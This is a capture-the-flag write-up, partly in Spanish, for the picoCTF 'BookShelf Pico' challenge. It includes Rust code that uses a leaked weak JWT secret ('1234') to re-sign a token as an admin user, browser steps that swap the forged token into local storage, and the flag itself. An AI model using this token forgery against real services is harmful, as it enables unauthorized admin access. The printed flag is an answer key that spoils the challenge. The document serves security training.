#### Description

BookShelf Pico, my premium online book-reading service.I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book!

Additional details will be available after launching your challenge instance.
### Solucion
```
## 1. Encontrar el secreto en el código fuente

En el código del servidor se observa que el JWT usa un secreto débil:

`1234`

---

# 2. Crear proyecto en Rust

`cargo new bookshelf cd bookshelf`

---

# 3. Agregar dependencias

`cargo install cargo-edit cargo add serde_json frank_jwt anyhow`

Si falla OpenSSL:

`sudo apt update sudo apt install libssl-dev pkg-config build-essential`

---

# 4. Editar el archivo principal

`cd src nano main.rs`

Pegar:

`use anyhow::Result; use frank_jwt::{decode, encode, Algorithm, ValidationOptions}; use serde_json::value::Value;  fn main() -> Result<()> {     let signing_key = "1234";     let encoded_token = "TOKEN_DE_LA_WEB";      let algorithm = Algorithm::HS256;     let validation = ValidationOptions::default();      let (header, mut payload) = decode(         encoded_token,         &signing_key,         algorithm,         &validation     )?;      payload["role"] = Value::String("Admin".into());     payload["email"] = Value::String("admin".into());     payload["userId"] = Value::Number(2.into());      let token = encode(header, &signing_key, &payload, algorithm)?;      println!("{}", payload);     println!("{}", token);      Ok(()) }`

Guardar:

`CTRL + X Y ENTER`

---

# 5. Ejecutar el programa

`cargo run`

Esto genera:

- payload modificado
- token nuevo firmado

---

# 6. Modificar el token en el navegador

Abrir herramientas:

`F12`

Ir a:

`Application → Local Storage`

Cambiar:

`auth-token token-payload`

Pegar:

Payload nuevo

`{"email":"admin","role":"Admin","userId":2,...}`

Token nuevo generado.

---

# 7. Recargar la página

`F5`

Abrir el libro de la bandera.

---

# Bandera obtenida

`picoCTF{w34k_jwt_n0t_g00d_6e5d7df5}`
```